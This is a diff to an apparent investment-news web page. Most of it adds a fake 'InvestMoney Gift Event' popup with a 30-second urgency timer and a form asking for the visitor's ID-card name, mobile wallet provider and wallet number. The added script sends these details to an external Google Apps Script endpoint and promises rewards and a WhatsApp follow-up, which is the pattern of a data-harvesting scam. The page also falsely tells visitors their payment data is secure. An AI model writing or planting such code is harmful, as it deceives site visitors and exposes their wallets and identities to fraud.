@@ -156,9 +156,269 @@
     <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap"></noscript>
     <link rel="stylesheet" href="/style.css">
 
+<style>
+/* ── Gift Popup Overlay ── */
+#giftOverlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.82);
+  backdrop-filter: blur(8px);
+  z-index: 99999;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+}
+#giftOverlay.show { display: flex; }
+
+#giftModal {
+  background: #0f1f14;
+  border: 1px solid rgba(212,168,67,0.3);
+  border-radius: 22px;
+  width: 100%;
+  max-width: 460px;
+  padding: 36px 30px 30px;
+  position: relative;
+  animation: giftPop 0.45s cubic-bezier(0.34,1.56,0.64,1) both;
+  box-shadow: 0 0 80px rgba(212,168,67,0.12), 0 40px 80px rgba(0,0,0,0.7);
+}
+@keyframes giftPop {
+  from { opacity:0; transform: scale(0.88) translateY(24px); }
+  to   { opacity:1; transform: scale(1) translateY(0); }
+}
+
+/* Gold corner accents */
+#giftModal::before, #giftModal::after {
+  content:'';
+  position:absolute;
+  width:28px; height:28px;
+  border-color: rgba(212,168,67,0.5);
+  border-style: solid;
+}
+#giftModal::before { top:12px; left:12px; border-width:2px 0 0 2px; border-radius:5px 0 0 0; }
+#giftModal::after  { bottom:12px; right:12px; border-width:0 2px 2px 0; border-radius:0 0 5px 0; }
+
+#giftClose {
+  position:absolute; top:12px; right:12px;
+  width:28px; height:28px;
+  background:rgba(255,255,255,0.07);
+  border:none; border-radius:50%;
+  color:#888; font-size:14px; cursor:pointer;
+  display:flex; align-items:center; justify-content:center;
+}
+#giftClose:hover { background:rgba(255,255,255,0.15); color:#fff; }
+
+.gm-icon {
+  width:56px; height:56px;
+  background:linear-gradient(135deg,rgba(212,168,67,0.2),rgba(212,168,67,0.05));
+  border:1px solid rgba(212,168,67,0.35);
+  border-radius:16px;
+  display:flex; align-items:center; justify-content:center;
+  font-size:26px; margin-bottom:16px;
+  box-shadow:0 6px 20px rgba(212,168,67,0.2);
+}
+.gm-eyebrow {
+  font-size:11px; font-weight:600; letter-spacing:0.14em;
+  text-transform:uppercase; color:#d4a843; margin-bottom:8px;
+  font-family:'Poppins',sans-serif;
+}
+.gm-title {
+  font-size:1.5rem; font-weight:700; color:#f0ede8;
+  line-height:1.2; margin-bottom:6px;
+  font-family:'Poppins',sans-serif;
+}
+.gm-amount {
+  display:inline-flex; align-items:center; gap:6px;
+  background:rgba(212,168,67,0.1); border:1px solid rgba(212,168,67,0.3);
+  border-radius:100px; padding:5px 14px; margin-bottom:12px;
+  font-weight:700; color:#f5cc6a; font-size:1.1rem;
+  font-family:'Poppins',sans-serif;
+}
+.gm-sub { font-size:13px; color:#7a8f7d; line-height:1.55; margin-bottom:22px; font-family:'Poppins',sans-serif; }
+
+.gm-group { margin-bottom:12px; }
+.gm-label {
+  display:block; font-size:11px; font-weight:600;
+  color:#7a8f7d; letter-spacing:0.07em; text-transform:uppercase;
+  margin-bottom:5px; font-family:'Poppins',sans-serif;
+}
+.gm-input, .gm-select {
+  width:100%;
+  background:rgba(255,255,255,0.05);
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:10px; padding:11px 14px;
+  color:#f0ede8; font-family:'Poppins',sans-serif; font-size:14px;
+  outline:none; transition:border-color 0.2s, box-shadow 0.2s;
+  box-sizing:border-box;
+}
+.gm-input:focus, .gm-select:focus {
+  border-color:#d4a843;
+  box-shadow:0 0 0 3px rgba(212,168,67,0.1);
+}
+.gm-select option { background:#0f1f14; }
+
+.gm-row { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
+
+.gm-btn {
+  width:100%; background:linear-gradient(135deg,#d4a843,#b8902a,#f5cc6a);
+  background-size:200%; color:#0a0c09;
+  border:none; padding:14px; border-radius:11px;
+  font-family:'Poppins',sans-serif; font-size:1rem; font-weight:700;
+  cursor:pointer; margin-top:4px; letter-spacing:0.03em;
+  box-shadow:0 6px 24px rgba(212,168,67,0.3);
+  transition:transform 0.15s, box-shadow 0.15s;
+  position:relative; overflow:hidden;
+}
+.gm-btn::after {
+  content:'';
+  position:absolute; inset:0;
+  background:linear-gradient(105deg,transparent 40%,rgba(255,255,255,0.25) 50%,transparent 60%);
+  transform:translateX(-100%);
+  animation:gmShimmer 2.5s ease infinite;
+}
+@keyframes gmShimmer { to { transform:translateX(200%); } }
+.gm-btn:hover { transform:translateY(-1px); box-shadow:0 10px 32px rgba(212,168,67,0.5); }
+.gm-btn:disabled { opacity:0.55; cursor:not-allowed; transform:none; }
+.gm-privacy { text-align:center; font-size:11px; color:#7a8f7d; margin-top:10px; font-family:'Poppins',sans-serif; }
+
+/* Success state */
+.gm-success { display:none; text-align:center; padding:10px 0; }
+.gm-success.show { display:block; }
+.gm-form-wrap.hide { display:none; }
+.gm-success-icon { font-size:3rem; animation:giftPop 0.5s cubic-bezier(0.34,1.56,0.64,1); }
+.gm-success h3 { font-family:'Poppins',sans-serif; font-size:1.4rem; font-weight:700; color:#f0ede8; margin:12px 0 8px; }
+.gm-success p { font-size:13px; color:#7a8f7d; line-height:1.6; font-family:'Poppins',sans-serif; }
+.gm-visit-btn {
+  display:inline-block; margin-top:16px;
+  background:linear-gradient(135deg,#1a8a4a,#166638);
+  color:#fff; padding:11px 24px; border-radius:100px;
+  text-decoration:none; font-family:'Poppins',sans-serif;
+  font-weight:600; font-size:13px;
+  box-shadow:0 6px 20px rgba(26,138,74,0.3);
+  transition:transform 0.15s;
+}
+.gm-visit-btn:hover { transform:translateY(-1px); }
+
+/* ── Timer Bar (top of page) ── */
+#giftTimerBar {
+  position:fixed; top:0; left:0; right:0; z-index:99998;
+  background:linear-gradient(90deg,#0f1f14,#0a1a0e 40%,#0f1f14);
+  border-bottom:1px solid rgba(212,168,67,0.18);
+  padding:10px 20px;
+  display:flex; align-items:center; justify-content:space-between;
+  gap:12px; flex-wrap:wrap;
+}
+.gtb-left { display:flex; align-items:center; gap:10px; flex:1; }
+.gtb-icon { font-size:20px; }
+.gtb-text { font-family:'Poppins',sans-serif; font-size:13px; color:#c8c0b0; }
+.gtb-text strong { color:#f5cc6a; }
+.gtb-timer {
+  display:flex; align-items:center; gap:8px;
+  font-family:'Poppins',sans-serif; font-size:13px; color:#7a8f7d;
+}
+.gtb-countdown {
+  background:rgba(212,168,67,0.15); border:1px solid rgba(212,168,67,0.3);
+  border-radius:6px; padding:3px 10px;
+  font-weight:700; color:#f5cc6a; font-size:15px; min-width:28px;
+  text-align:center; transition:color 0.3s;
+}
+.gtb-countdown.urgent { color:#ff6b2b; border-color:rgba(255,107,43,0.4); background:rgba(255,107,43,0.1); }
+
+/* Claim button in bar */
+#gtbClaimBtn {
+  background:linear-gradient(135deg,#d4a843,#b8902a);
+  color:#0a0c09; border:none; padding:8px 18px;
+  border-radius:100px; font-family:'Poppins',sans-serif;
+  font-weight:700; font-size:13px; cursor:pointer;
+  white-space:nowrap; animation:gtbPulse 2.5s ease-in-out infinite;
+  display:none;
+}
+@keyframes gtbPulse {
+  0%,100%{box-shadow:0 0 12px rgba(212,168,67,0.3)}
+  50%{box-shadow:0 0 24px rgba(212,168,67,0.6)}
+}
+#gtbClaimBtn:hover { animation:none; transform:scale(1.04); }
+
+/* Push page content down when bar is showing */
+body { padding-top: 0 !important; }
+.header { margin-top: 50px; }
+</style>
+
 
 </head>
 <body>
+  <!-- ── Timer Bar ── -->
+  <div id="giftTimerBar">
+    <div class="gtb-left">
+      <span class="gtb-icon">🎁</span>
+      <div class="gtb-text">
+        Join our <strong>InvestMoney Gift Event</strong>! Ends in:
+      </div>
+      <div class="gtb-timer">
+        <div id="gtbMin" class="gtb-countdown">00</div> :
+        <div id="gtbSec" class="gtb-countdown">00</div>
+      </div>
+    </div>
+    <button id="gtbClaimBtn" onclick="openGiftModal()">Claim Gift Now</button>
+  </div>
+
+  <!-- ── Gift Popup Overlay ── -->
+  <div id="giftOverlay">
+    <div id="giftModal">
+      <button id="giftClose" onclick="closeGiftModal()">✕</button>
+      
+      <div id="gmFormWrap" class="gm-form-wrap">
+        <div class="gm-icon">💸</div>
+        <div class="gm-eyebrow">Payment Setup</div>
+        <h2 class="gm-title">Enter Payment Details</h2>
+        <div class="gm-amount">Receive Your Rewards</div>
+        <p class="gm-sub">Please provide your correct wallet details to receive your investment rewards directly.</p>
+
+        <form onsubmit="handleGiftSubmit(event)">
+          <div class="gm-group">
+            <label class="gm-label">Full Name (As per ID Card)</label>
+            <input type="text" id="gmFullName" class="gm-input" placeholder="Arif Khan" required>
+          </div>
+
+          <div class="gm-group">
+            <label class="gm-label">Select Wallet</label>
+            <select id="gmWallet" class="gm-select" required>
+              <option value="">Select your wallet</option>
+              <option value="JazzCash">JazzCash</option>
+              <option value="EasyPaisa">EasyPaisa</option>
+              <option value="UPaisa">UPaisa</option>
+              <option value="SadaPay">SadaPay</option>
+              <option value="NayaPay">NayaPay</option>
+            </select>
+          </div>
+
+          <div class="gm-group">
+            <label class="gm-label">Wallet Number</label>
+            <input type="tel" id="gmWalletNumber" class="gm-input" placeholder="03XXXXXXXXX" pattern="03[0-9]{9}" title="Please enter a valid 11-digit Pakistani number starting with 03" required>
+          </div>
+
+          <!-- Honeypot field (hidden from users, bots will fill it) -->
+          <div style="display:none;">
+            <input type="text" id="gmHoneypot" tabindex="-1" autocomplete="off">
+          </div>
+
+          <button type="submit" id="gmSubmitBtn" class="gm-btn">Submit Payment Details</button>
+
+          <p class="gm-privacy">🔒 Your payment data is secure.</p>
+        </form>
+      </div>
+
+
+      <!-- Success State -->
+      <div id="gmSuccess" class="gm-success">
+        <div class="gm-success-icon">🎉</div>
+        <h3>Application Received!</h3>
+        <p>Thank you! Our lead analyst will review your details and contact you via WhatsApp within 24 hours.</p>
+        <a href="#" class="gm-visit-btn" onclick="closeGiftModal()">Continue Reading</a>
+      </div>
+    </div>
+  </div>
+
     <!-- Header -->
     <header class="header">
         <div class="container">
@@ -2674,17 +2934,28 @@
             function loadAllArticles(category = null) {
                 const container = document.getElementById('articlesGrid');
                 let filtered = articles;
-                
+
                 if (category) {
                     filtered = articles.filter(a => a.category === category);
                     filterBanner.style.display = 'block';
                     filterCategoryName.textContent = getCategoryName(category);
                 } else {
                     filterBanner.style.display = 'none';
+
+                    // Show articles from the last 5 days
+                    const today = new Date();
+                    const fiveDaysAgo = new Date(today);
+                    fiveDaysAgo.setDate(today.getDate() - 5);
+
+                    filtered = articles.filter(a => new Date(a.date) >= fiveDaysAgo);
+
+                    // If less than 6 articles, show the 6 most recent anyway
+                    if (filtered.length < 6) {
+                        filtered = [...articles].sort((a, b) => new Date(b.date) - new Date(a.date)).slice(0, 6);
+                    }
                 }
 
                 filtered.sort((a, b) => new Date(b.date) - new Date(a.date));
-
                 if (filtered.length === 0) {
                     container.innerHTML = '<div class="no-articles" style="grid-column: 1/-1;"><h3>No articles found</h3><p>Check back soon!</p></div>';
                     return;
@@ -2987,6 +3258,134 @@
     </div>
   </article>
 </section>
+
+
+  <!-- ── Gift Popup Logic ── -->
+<script>
+(function() {
+  // CONFIG: REPLACE WITH YOUR GOOGLE APPS SCRIPT URL
+  var SHEET_URL = 'https://script.google.com/macros/s/AKfycbzYVqM6FXguEo-0OUxpidL3qEI5XX7BeHWrfxO39X_C7GaYa-Irx9zeU4c2TVYV9JpT5g/exec';
+
+  var timerDuration = 30; // 30 seconds
+  var storageKey = 'gm_timer_end_v2';
+
+  window.addEventListener('DOMContentLoaded', function() {
+    initTimer();
+  });
+
+  function initTimer() {
+    var endTime = localStorage.getItem(storageKey);
+    var now = Math.floor(Date.now() / 1000);
+
+    if (!endTime || now > parseInt(endTime)) {
+      endTime = now + timerDuration;
+      localStorage.setItem(storageKey, endTime);
+    }
+
+    updateTimerDisplay(endTime);
+    var intv = setInterval(function() {
+      var currentNow = Math.floor(Date.now() / 1000);
+      var diff = endTime - currentNow;
+      if (diff <= 0) {
+        clearInterval(intv);
+        document.getElementById('gtbMin').textContent = '00';
+        document.getElementById('gtbSec').textContent = '00';
+        document.getElementById('gtbClaimBtn').style.display = 'block';
+        return;
+      }
+      updateTimerDisplay(endTime);
+    }, 1000);
+  }
+
+  function updateTimerDisplay(endTime) {
+    var diff = endTime - Math.floor(Date.now() / 1000);
+    if (diff < 0) diff = 0;
+    var m = Math.floor(diff / 60);
+    var s = diff % 60;
+    document.getElementById('gtbMin').textContent = (m < 10 ? '0' : '') + m;
+    document.getElementById('gtbSec').textContent = (s < 10 ? '0' : '') + s;
+
+    if (diff < 60) {
+      document.getElementById('gtbMin').classList.add('urgent');
+      document.getElementById('gtbSec').classList.add('urgent');
+    }
+  }
+
+  // ── Global Handlers ──
+  window.openGiftModal = function() {
+    document.getElementById('giftOverlay').classList.add('show');
+    document.body.style.overflow = 'hidden';
+  };
+  window.closeGiftModal = function() {
+    document.getElementById('giftOverlay').classList.remove('show');
+    document.body.style.overflow = '';
+  };
+
+  window.handleGiftSubmit = async function(e) {
+    e.preventDefault();
+    
+    // Honeypot check
+    if (document.getElementById('gmHoneypot').value !== "") {
+      console.warn("Bot detected.");
+      return; 
+    }
+
+    var fullName = document.getElementById('gmFullName').value;
+    var wallet   = document.getElementById('gmWallet').value;
+    var number   = document.getElementById('gmWalletNumber').value.replace(/\s/g, ''); // Remove spaces
+
+    // Strict Pakistani Phone Validation
+    var phoneRegex = /^03[0-9]{9}$/;
+    if(!phoneRegex.test(number)) { 
+      alert('Please enter a valid 11-digit number starting with 03 (e.g., 03001234567).'); 
+      return; 
+    }
+
+    var btn = document.getElementById('gmSubmitBtn');
+    btn.disabled = true;
+    btn.textContent = '⏳ Processing...';
+    
+    try {
+      await sendToSheet({
+        type: 'payment_setup',
+        name: fullName,
+        wallet: wallet,
+        wallet_number: number,
+        referrer: document.referrer || 'direct',
+        page: window.location.href,
+        ts: new Date().toISOString(),
+        hp: "" // Sending empty honeypot to verify on server
+      });
+
+      document.getElementById('gmFormWrap').classList.add('hide');
+      document.getElementById('gmSuccess').classList.add('show');
+    } catch (err) {
+      alert("Something went wrong. Please try again.");
+      btn.disabled = false;
+      btn.textContent = 'Submit Payment Details';
+    }
+  };
+
+
+
+  // ── Send to Google Sheets ──
+  async function sendToSheet(data) {
+    if (SHEET_URL === 'YOUR_APPS_SCRIPT_URL_HERE') {
+      console.log('[InvestMoney Gift] Demo mode — data:', data);
+      return;
+    }
+    try {
+      await fetch(SHEET_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify(data)
+      });
+    } catch(err) {
+      console.warn('Sheet send failed:', err);
+    }
+  }
+})();
+</script>
 
 
 </body>
